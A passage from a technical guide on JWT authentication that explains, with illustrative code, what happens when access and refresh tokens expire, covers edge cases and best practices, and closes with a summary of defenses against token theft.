2. **Client Attempts Refresh**
   ```javascript
   // Client tries to refresh
   POST /refresh
   Cookie: refresh_token=eyJhbG... (expired refresh token)
   ```

3. **Server Validates Refresh Token**
   ```javascript
   // Server checks refresh token expiration
   const currentTime = Math.floor(Date.now() / 1000);
   const refreshExpiration = refreshPayload.exp;
   
   if (currentTime >= refreshExpiration) {
     // Refresh token is expired!
     return res.status(401).json({
       error: "Refresh token expired",
       code: "SESSION_EXPIRED"
     });
   }
   
   // OR if database-stored:
   const tokenRecord = await db.refreshTokens.findOne(...);
   if (new Date() >= tokenRecord.expiresAt) {
     return res.status(401).json({
       error: "Session expired"
     });
   }
   ```

4. **Refresh Request Rejected**
   ```javascript
   // Server response
   HTTP/1.1 401 Unauthorized
   {
     "error": "Session expired",
     "code": "SESSION_EXPIRED",
     "message": "Please log in again"
   }
   ```

5. **Client Clears All Tokens**
   ```javascript
   // Client removes all stored tokens
   localStorage.removeItem('access_token');
   document.cookie = 'refresh_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC;';
   
   // Clear any in-memory tokens
   accessToken = null;
   ```

6. **User Redirected to Login**
   ```javascript
   // Client redirects to login page
   window.location.href = '/login';
   // OR show login modal
   showLoginModal();
   ```

**User Experience:**
- ❌ Interruption - user must log in again
- ❌ Session ends - all authentication state is cleared
- ⚠️ Data may be lost - unsaved work might be lost (depends on app)

**Visual Flow:**
```
User Action
    │
    ▼
API Request (expired access token)
    │
    ▼
401 Unauthorized
    │
    ▼
Automatic Refresh Attempt
    │
    ▼
Refresh Token Validation
    │
    ▼
Refresh Token EXPIRED
    │
    ▼
401 Unauthorized - Session Expired
    │
    ▼
Clear All Tokens
    │
    ▼
Redirect to Login Page
    │
    ▼
User Must Re-authenticate
```

### Comparison Table

| Aspect | Access Token Expires | Refresh Token Expires |
|--------|---------------------|----------------------|
| **What Happens** | Automatic refresh | User must log in again |
| **User Impact** | Seamless (usually) | Interruption |
| **Server Response** | 401 → Refresh succeeds | 401 → Refresh fails |
| **New Token Issued?** | Yes (new access token) | No |
| **Session Continues?** | Yes | No |
| **User Action Required** | None | Must re-authenticate |
| **Typical Frequency** | Every 15-60 minutes | Every 7-30 days |

### Edge Cases and Special Scenarios

#### 1. Access Token Expires During Active Use

```javascript
// User is actively using the app
// Access token expires mid-session

// Scenario A: Proactive Refresh (Best Practice)
// Client refreshes before expiration (e.g., at 80% of lifetime)
if (timeUntilExpiry < (tokenLifetime * 0.2)) {
  refreshToken(); // Refresh proactively
}
// Result: Seamless - user never sees interruption

// Scenario B: Reactive Refresh
// Client waits until 401, then refreshes
// Result: Slight delay but still seamless
```

#### 2. Refresh Token Expires While User Is Active

```javascript
// User has been active for 7 days
// Refresh token expires

// Next API request:
1. Access token expired → 401
2. Attempt refresh → Refresh token expired → 401
3. User must log in again

// Best Practice: Warn user before refresh token expires
if (refreshTokenExpiresIn < 24 * 60 * 60) { // Less than 24 hours
  showWarning("Your session will expire soon. Please save your work.");
}
```

#### 3. Multiple Tabs/Devices

```javascript
// User has app open in multiple tabs
// Access token expires in all tabs simultaneously

// Tab 1: Refreshes token successfully
// Tab 2: Also tries to refresh
// - If refresh token rotation: Tab 2's refresh might fail
// - If no rotation: Both tabs get new tokens

// Best Practice: Use token rotation to detect token theft
// If refresh token used twice → potential theft detected
```

#### 4. Network Issues During Refresh

```javascript
// Access token expires
// Client attempts refresh
// Network request fails (offline, timeout, etc.)

// Scenario A: Retry with backoff
retryRefreshWithBackoff(maxRetries: 3);

// Scenario B: Show error, allow manual retry
showError("Connection failed. Please try again.");

// Scenario C: Graceful degradation
// Some apps allow limited functionality with expired token
```

### Security Implications

**Access Token Expiration:**
- Limits exposure window if token is stolen
- Short lifetime (15-60 min) means stolen tokens become useless quickly
- Automatic refresh maintains user experience

**Refresh Token Expiration:**
- Forces periodic re-authentication
- Limits long-term unauthorized access
- If stolen, attacker has access until refresh token expires (days/weeks)

**Why Both Are Needed:**
- Access tokens: Short-lived for security, refreshed frequently
- Refresh tokens: Long-lived for UX, but can be revoked server-side

### Best Practices

1. **Proactive Refresh**: Refresh access tokens before expiration (e.g., at 80% of lifetime)
2. **Token Rotation**: Issue new refresh token on each refresh to detect theft
3. **Graceful Handling**: Handle expiration errors gracefully with retry logic
4. **User Warnings**: Warn users before refresh token expires
5. **Offline Handling**: Handle network failures during refresh gracefully

---

## Conclusion

JWT token theft represents a significant security threat to modern web applications due to the bearer nature of tokens and their widespread use. The attack can be executed through multiple vectors including XSS injection, man-in-the-middle attacks, browser malware, and compromised third-party scripts. However, implementing defense-in-depth strategies significantly reduces the risk.

The most effective protection combines:
- **Secure storage** using HttpOnly cookies with Secure and SameSite attributes
- **XSS prevention** through Content Security Policy and input sanitization
- **Transport security** with HTTPS enforcement and HSTS
- **Token design** using short-lived access tokens with refresh token rotation
- **Runtime protection** through token binding and behavioral monitoring

Organizations should prioritize these defenses based on their security requirements, implementing multiple overlapping protections to ensure that the failure of one layer doesn't result in complete compromise. Regular security audits, penetration testing, and staying current with evolving attack techniques and mitigation strategies remain essential for maintaining robust JWT security posture.

